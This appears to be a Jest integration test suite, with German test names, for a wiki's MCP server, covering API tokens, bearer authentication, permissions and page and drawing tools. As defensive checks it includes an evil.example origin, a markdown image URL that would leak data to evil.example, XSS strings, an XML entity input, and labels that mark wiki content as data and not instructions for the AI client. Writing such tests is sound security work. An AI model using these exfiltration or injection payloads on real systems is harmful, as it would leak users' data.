import type { CreatedApiTokenDto, DocNode, MyApiTokensDto } from '@wiki/shared';
import request from 'supertest';
import { extractXml } from '../src/mcp/drawio';
import { Account, createUser, ORIGIN, resetState, startApp, TestContext, totpAt } from './helpers';
import { createPage, createSpace } from './fixtures';

let ctx: TestContext;
let admin: Account;
let anna: Account;
let bernd: Account;

const XML = `<mxGraphModel><root><mxCell id="0"/><mxCell id="1" parent="0"/>
<mxCell id="r" value="Router" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1"><mxGeometry x="20" y="20" width="120" height="60" as="geometry"/></mxCell>
<mxCell id="s" value="Server" style="ellipse;html=1;" vertex="1" parent="1"><mxGeometry x="220" y="120" width="120" height="60" as="geometry"/></mxCell>
<mxCell id="e" value="LAN" style="edgeStyle=orthogonalEdgeStyle;" edge="1" parent="1" source="r" target="s"><mxGeometry relative="1" as="geometry"/></mxCell>
</root></mxGraphModel>`;

beforeAll(async () => {
  ctx = await startApp();
});

afterAll(async () => {
  await ctx.app.close();
});

beforeEach(async () => {
  await resetState(ctx);
  admin = await createUser(ctx, 'admin@example.de', { admin: true, ip: '10.0.1.1' });
  anna = await createUser(ctx, 'anna@example.de', { ip: '10.0.1.2' });
  bernd = await createUser(ctx, 'bernd@example.de', { ip: '10.0.1.3' });
});

async function enable(on = true) {
  const res = await admin.client.put('/admin/api-access', { enabled: on });
  expect(res.status).toBe(200);
}

/** Frischer 2FA-Code: der Einmal-Schutz wird zurückgesetzt, damit mehrere Codes im selben Zeitfenster gehen */
async function code(account: Account) {
  await ctx.prisma.user.update({ where: { id: account.userId }, data: { totpLastStep: null } });
  return totpAt(account.secret, Date.now());
}

async function createToken(account: Account, scope: 'read' | 'write' = 'write'): Promise<CreatedApiTokenDto> {
  const res = await account.client.post('/me/tokens', { name: `Claude ${scope}`, scope, expiresInDays: 30, code: await code(account) });
  if (res.status !== 201) throw new Error(`Token anlegen: ${res.status} ${JSON.stringify(res.body)}`);
  return res.body;
}

let rpcId = 0;
function mcp(token: string | null, method: string, params: object = {}, headers: Record<string, string> = {}) {
  const req = request(ctx.app.getHttpServer())
    .post('/api/v1/mcp')
    .set('X-Forwarded-For', '10.0.9.9')
    .set('Accept', 'application/json, text/event-stream')
    .set('Content-Type', 'application/json');
  if (token) req.set('Authorization', `Bearer ${token}`);
  for (const [k, v] of Object.entries(headers)) req.set(k, v);
  return req.send({ jsonrpc: '2.0', id: ++rpcId, method, params });
}

interface ToolOutput {
  isError?: boolean;
  text: string;
  json: () => any; // eslint-disable-line @typescript-eslint/no-explicit-any
}

async function call(token: string, name: string, args: object): Promise<ToolOutput> {
  const res = await mcp(token, 'tools/call', { name, arguments: args });
  expect(res.status).toBe(200);
  if (res.body.error) throw new Error(JSON.stringify(res.body.error));
  const text: string = res.body.result.content[0].text;
  return { isError: res.body.result.isError, text, json: () => JSON.parse(text) };
}

describe('API-Tokens verwalten', () => {
  it('legt Tokens nur bei eingeschaltetem MCP-Zugang und mit gültigem 2FA-Code an', async () => {
    const off = await anna.client.post('/me/tokens', { name: 'x', scope: 'read', expiresInDays: 30, code: await code(anna) });
    expect(off.status).toBe(403);
    expect(off.body.error.code).toBe('MCP_DISABLED');

    await enable();
    const wrong = await anna.client.post('/me/tokens', { name: 'x', scope: 'read', expiresInDays: 30, code: '000000' });
    expect(wrong.status).toBe(401);
    const tooLong = await anna.client.post('/me/tokens', { name: 'x', scope: 'read', expiresInDays: 1000, code: await code(anna) });
    expect(tooLong.status).toBe(400);

    const token = await createToken(anna, 'read');
    expect(token.token).toMatch(/^wfd_[A-Za-z0-9_-]{43}$/);
    expect(token.prefix).toBe(token.token.slice(0, 8));
    expect(token.status).toBe('active');

    // Gespeichert ist nur der Hash; die Liste zeigt das Token nicht mehr
    const row = await ctx.prisma.apiToken.findUniqueOrThrow({ where: { id: token.id } });
    expect(row.tokenHash).not.toContain(token.token);
    const list = (await anna.client.get('/me/tokens')).body as MyApiTokensDto;
    expect(list.enabled).toBe(true);
    expect(list.endpoint).toBe(`${ORIGIN}/api/v1/mcp`);
    expect(JSON.stringify(list)).not.toContain(token.token);
    expect(await ctx.prisma.auditLog.count({ where: { action: 'token.created', targetId: token.id } })).toBe(1);

    // Fremde Tokens lassen sich nicht widerrufen, eigene schon
    expect((await bernd.client.delete(`/me/tokens/${token.id}`)).status).toBe(404);
    expect((await anna.client.delete(`/me/tokens/${token.id}`)).status).toBe(204);
    expect((await mcp(token.token, 'tools/list')).status).toBe(401);
  });

  it('Administratoren sehen alle Tokens und widerrufen sie; nur sie schalten den Zugang', async () => {
    expect((await anna.client.put('/admin/api-access', { enabled: true })).status).toBe(403);
    await enable();
    const token = await createToken(anna);
    const all = await admin.client.get('/admin/api-access');
    expect(all.body.tokens).toEqual([expect.objectContaining({ id: token.id, user: { id: anna.userId, displayName: 'anna' } })]);
    expect((await admin.client.delete(`/admin/api-access/tokens/${token.id}`)).status).toBe(204);
    expect((await mcp(token.token, 'tools/list')).status).toBe(401);
  });

  it('„Alle Sitzungen beenden“ und Deaktivieren widerrufen auch die Tokens', async () => {
    await enable();
    const t1 = await createToken(anna);
    expect((await admin.client.delete(`/admin/users/${anna.userId}/sessions`)).status).toBe(204);
    expect((await mcp(t1.token, 'tools/list')).status).toBe(401);
    const t2 = await createToken(bernd);
    expect((await admin.client.patch(`/admin/users/${bernd.userId}`, { status: 'deactivated' })).status).toBe(200);
    expect((await mcp(t2.token, 'tools/list')).status).toBe(401);
  });
});

describe('Anmeldung am MCP-Server', () => {
  it('verlangt ein gültiges Bearer-Token und keine Cookies', async () => {
    await enable();
    const missing = await mcp(null, 'tools/list');
    expect(missing.status).toBe(401);
    expect(missing.headers['www-authenticate']).toContain('Bearer');

    const wrong = await mcp(`wfd_${'A'.repeat(43)}`, 'tools/list');
    expect(wrong.status).toBe(401);
    expect(await ctx.prisma.auditLog.count({ where: { action: 'mcp.auth.failed' } })).toBe(1);

    // Die Browser-Sitzung zählt hier nicht (auch nicht mit CSRF-Token)
    const cookie = await anna.client.agent
      .post('/api/v1/mcp')
      .set('X-CSRF-Token', anna.client.csrf)
      .set('Accept', 'application/json, text/event-stream')
      .send({ jsonrpc: '2.0', id: 1, method: 'tools/list' });
    expect(cookie.status).toBe(401);
  });

  it('weist abgelaufene Tokens, fremde Origins und ausgeschalteten Zugang ab', async () => {
    await enable();
    const token = await createToken(anna);
    expect((await mcp(token.token, 'tools/list')).status).toBe(200);
    expect((await mcp(token.token, 'tools/list', {}, { Origin: 'https://evil.example' })).status).toBe(403);

    await enable(false);
    const off = await mcp(token.token, 'tools/list');
    expect(off.status).toBe(403);
    expect(off.body.error.code).toBe('MCP_DISABLED');
    await enable();

    await ctx.prisma.apiToken.update({ where: { id: token.id }, data: { expiresAt: new Date(Date.now() - 1000) } });
    expect((await mcp(token.token, 'tools/list')).status).toBe(401);
  });

  it('sperrt eine IP nach wiederholt falschen Tokens', async () => {
    await enable();
    for (let i = 0; i < 10; i++) await mcp(`wfd_${String(i).padStart(43, 'x')}`, 'tools/list');
    const token = await createToken(anna);
    expect((await mcp(token.token, 'tools/list')).status).toBe(429);
  });

  it('kennt nur POST', async () => {
    const res = await request(ctx.app.getHttpServer()).get('/api/v1/mcp').set('X-Forwarded-For', '10.0.9.9');
    expect(res.status).toBe(405);
  });

  it('merkt sich die letzte Verwendung', async () => {
    await enable();
    const token = await createToken(anna);
    await mcp(token.token, 'tools/list');
    const row = await ctx.prisma.apiToken.findUniqueOrThrow({ where: { id: token.id } });
    expect(row.lastUsedAt).not.toBeNull();
    expect(row.lastUsedIp).toBe('10.0.9.9');
  });
});

describe('Werkzeuge', () => {
  it('Tokens mit Bereich read sehen keine ändernden Werkzeuge', async () => {
    await enable();
    const read = await createToken(anna, 'read');
    const write = await createToken(anna, 'write');
    const names = async (t: string) => ((await mcp(t, 'tools/list')).body.result.tools as { name: string }[]).map((x) => x.name).sort();
    expect(await names(read.token)).toEqual(['get_page_tree', 'list_spaces', 'read_drawing', 'read_page', 'search']);
    expect(await names(write.token)).toEqual(
      ['create_drawing', 'create_page', 'get_page_tree', 'list_spaces', 'read_drawing', 'read_page', 'search', 'update_drawing', 'update_page'].sort(),
    );
    const res = await mcp(read.token, 'tools/call', { name: 'create_page', arguments: { space: 'IT', title: 'x', markdown: 'y' } });
    expect(res.body.result?.isError ?? Boolean(res.body.error)).toBe(true);
  });

  it('hält sich an Space-Rollen und Seiteneinschränkungen', async () => {
    await enable();
    await createSpace(anna.client, 'GEHEIM', 'Geheim', { open: false });
    const it = await createSpace(anna.client, 'IT', 'IT-Team');
    const token = (await createToken(bernd)).token;

    const spaces = (await call(token, 'list_spaces', {})).json();
    expect(spaces.map((s: { key: string }) => s.key)).toEqual(['IT']);
    expect((await call(token, 'get_page_tree', { space: 'GEHEIM' })).isError).toBe(true);
    expect((await call(token, 'read_page', { pageId: it.homePageId })).isError).toBeFalsy();

    // Seite mit Ansehen-Einschränkung nur für Anna: für Bernd nicht vorhanden
    const hidden = await createPage(anna.client, 'IT', 'Nur Anna');
    expect((await anna.client.put(`/pages/${hidden.id}/restrictions`, { view: [{ type: 'user', id: anna.userId }], edit: [] })).status).toBe(200);
    const res = await call(token, 'read_page', { pageId: hidden.id });
    expect(res.isError).toBe(true);
    expect(res.text).toContain('NOT_FOUND');
    expect((await call(token, 'search', { query: 'Anna' })).json().results).toEqual([]);

    // Nur Leserechte im Space: Anlegen scheitert trotz write-Token
    const g = await ctx.prisma.group.findUniqueOrThrow({ where: { name: 'alle-benutzer' } });
    await ctx.prisma.spacePermission.updateMany({ where: { space: { key: 'IT' }, groupId: g.id }, data: { role: 'viewer' } });
    const denied = await call(token, 'create_page', { space: 'IT', title: 'Neu', markdown: 'Text' });
    expect(denied.isError).toBe(true);
    expect(denied.text).toContain('FORBIDDEN');
  });

  it('legt Seiten aus Markdown an und ändert sie mit Versionsprüfung', async () => {
    await enable();
    const it = await createSpace(anna.client, 'IT', 'IT-Team');
    const token = await createToken(anna);

    const created = (
      await call(token.token, 'create_page', {
        space: 'IT',
        parentId: it.homePageId,
        title: 'VPN einrichten',
        markdown: '## Schritte\n\n1. App installieren\n2. **Profil** laden\n\n> [!warning]\n> Nur mit Firmengerät.\n\n<script>alert(1)</script>',
      })
    ).json();
    expect(created).toMatchObject({ title: 'VPN einrichten', version: 1, space: 'IT', url: `${ORIGIN}/pages/${created.id}` });

    const page = await ctx.prisma.page.findUniqueOrThrow({ where: { id: created.id } });
    expect(page.parentId).toBe(it.homePageId);
    const content = page.content as unknown as DocNode;
    expect(content.content?.map((n) => n.type)).toEqual(['heading', 'orderedList', 'callout', 'paragraph']);
    // HTML wird nicht ausgeführt, sondern bleibt Text
    expect(JSON.stringify(content.content?.[3])).toContain('<script>alert(1)</script>');
    expect(content.content?.[3].content?.[0].marks).toBeUndefined();

    const read = await call(token.token, 'read_page', { pageId: created.id });
    expect(read.text).toContain('"version": 1');
    expect(read.text).toContain('> [!warning]\n> Nur mit Firmengerät.');

    const updated = (await call(token.token, 'update_page', { pageId: created.id, version: 1, mode: 'append', markdown: 'Fertig.' })).json();
    expect(updated).toMatchObject({ version: 2, changed: true });
    const conflict = await call(token.token, 'update_page', { pageId: created.id, version: 1, markdown: 'überschrieben' });
    expect(conflict.isError).toBe(true);
    expect(conflict.text).toContain('Aktuelle Version: 2');

    const bad = await call(token.token, 'update_page', { pageId: created.id, version: 2, markdown: '[x](javascript:alert(1))' });
    // markdown-it macht aus unsicheren Links Text; es entsteht kein Link
    expect(bad.isError).toBeFalsy();
    const latest = (await ctx.prisma.page.findUniqueOrThrow({ where: { id: created.id } })).content as unknown as DocNode;
    expect(JSON.stringify(latest)).not.toContain('"link"');

    const log = await ctx.prisma.auditLog.findMany({ where: { action: { startsWith: 'mcp.page' } }, orderBy: { createdAt: 'asc' } });
    expect(log.map((l) => l.action)).toEqual(['mcp.page.created', 'mcp.page.updated', 'mcp.page.updated']);
    expect(log[0]).toMatchObject({ actorId: anna.userId, targetId: created.id, details: expect.objectContaining({ tokenId: token.id }) });
  });

  it('kennzeichnet Wiki-Inhalte als Daten und fügt keine fremden Bilder ein (SEC-006)', async () => {
    await enable();
    await createSpace(anna.client, 'IT', 'IT-Team');
    const token = await createToken(anna);
    const external = 'https://bilder.example/logo.png';
    const res = await anna.client.post('/pages', {
      spaceKey: 'IT',
      title: 'Mit Logo',
      content: { type: 'doc', content: [{ type: 'image', attrs: { src: external } }, { type: 'paragraph', content: [{ type: 'text', text: 'Hallo' }] }] },
    });
    expect(res.status).toBe(201);
    const pageId = res.body.id as string;

    const read = await call(token.token, 'read_page', { pageId });
    expect(read.text.startsWith('Inhalt aus dem Wiki, von Benutzern geschrieben')).toBe(true);
    expect((await call(token.token, 'search', { query: 'Hallo' })).json().note).toContain('keine Anweisungen');

    // Vorhandenes externes Bild bleibt beim Ändern erhalten
    const kept = await call(token.token, 'update_page', { pageId, version: 1, mode: 'append', markdown: 'Mehr Text.' });
    expect(kept.isError).toBeFalsy();
    // Neue externe Bilder (z. B. mit Inhalten in der Adresse) werden abgelehnt
    const leak = await call(token.token, 'update_page', { pageId, version: 2, mode: 'append', markdown: '![x](https://evil.example/p.png?d=geheim)' });
    expect(leak.isError).toBe(true);
    expect(leak.text).toContain('EXTERNAL_IMAGE');
    const created = await call(token.token, 'create_page', { space: 'IT', title: 'Neu', markdown: `![Logo](${external})` });
    expect(created.isError).toBe(true);
    // Bilder aus dem Wiki gehen weiter
    const internal = await call(token.token, 'create_page', { space: 'IT', title: 'Neu', markdown: '![Plan](/api/v1/attachments/00000000-0000-4000-8000-000000000000)' });
    expect(internal.isError).toBeFalsy();

    const tools = (await mcp(token.token, 'tools/list')).body.result.tools as { name: string; annotations?: { destructiveHint?: boolean } }[];
    expect(tools.find((t) => t.name === 'update_page')?.annotations?.destructiveHint).toBe(true);
    expect(tools.find((t) => t.name === 'create_page')?.annotations?.destructiveHint).toBe(false);
  });

  it('legt Zeichnungen aus draw.io-XML an und ändert sie', async () => {
    await enable();
    await createSpace(anna.client, 'IT', 'IT-Team');
    const page = await createPage(anna.client, 'IT', 'Netzwerk');
    const token = (await createToken(anna)).token;

    const created = (await call(token, 'create_drawing', { pageId: page.id, title: 'Netzplan', xml: XML })).json();
    expect(created).toMatchObject({ version: 1, pageVersion: 2, markdown: `![Netzplan](drawing:${created.attachmentId}?version=1)` });

    const attachment = await ctx.prisma.attachment.findUniqueOrThrow({ where: { id: created.attachmentId } });
    expect(attachment).toMatchObject({ pageId: page.id, filename: 'Netzplan.drawio.png', mimeType: 'image/png' });
    const png = await ctx.app.get((await import('../src/attachments/attachment-storage.service')).AttachmentStorageService).readAll(attachment.storageKey, 1e7);
    expect(extractXml(png)).toContain('value="Router"');

    const content = (await ctx.prisma.page.findUniqueOrThrow({ where: { id: page.id } })).content as unknown as DocNode;
    const drawing = content.content?.at(-1);
    expect(drawing).toMatchObject({ type: 'drawing', attrs: { attachmentId: created.attachmentId, version: 1, title: 'Netzplan', text: 'Router\nServer\nLAN' } });
    expect(drawing?.attrs?.width).toBeGreaterThan(300);
    // Die Suche findet Beschriftungen der Zeichnung
    expect((await call(token, 'search', { query: 'Router' })).json().results[0].id).toBe(page.id);

    // Lesen, XML ändern, als neue Fassung speichern: die Seite zeigt auf Fassung 2
    const xml = (await call(token, 'read_drawing', { attachmentId: created.attachmentId })).text;
    expect(xml).toContain('<mxfile');
    const changed = (await call(token, 'update_drawing', { attachmentId: created.attachmentId, xml: XML.replace('Server', 'Datenbank') })).json();
    expect(changed).toMatchObject({ version: 2, pageUpdated: true, pageVersion: 3 });
    const after = (await ctx.prisma.page.findUniqueOrThrow({ where: { id: page.id } })).content as unknown as DocNode;
    expect(after.content?.at(-1)?.attrs).toMatchObject({ version: 2, text: 'Router\nDatenbank\nLAN' });

    // Markdown-Umweg über read_page/update_page lässt die Zeichnung samt Größe und Text unverändert
    const md = (await call(token, 'read_page', { pageId: page.id })).text.split('\n---\n\n')[1];
    expect(md).toContain(`![Netzplan](drawing:${created.attachmentId}?version=2)`);
    await call(token, 'update_page', { pageId: page.id, version: 3, markdown: `Vorher\n\n${md}` });
    const roundtrip = (await ctx.prisma.page.findUniqueOrThrow({ where: { id: page.id } })).content as unknown as DocNode;
    expect(roundtrip.content?.find((n) => n.type === 'drawing')).toEqual(after.content?.at(-1));

    // Ungültiges XML gibt eine verständliche Fehlermeldung
    const bad = await call(token, 'create_drawing', { pageId: page.id, title: 'Kaputt', xml: '<mxGraphModel><root>' });
    expect(bad.isError).toBe(true);
    const entity = await call(token, 'create_drawing', { pageId: page.id, title: 'Böse', xml: '<!DOCTYPE x [<!ENTITY a "b">]><mxGraphModel/>' });
    expect(entity.text).toContain('DOCTYPE');
  });
});
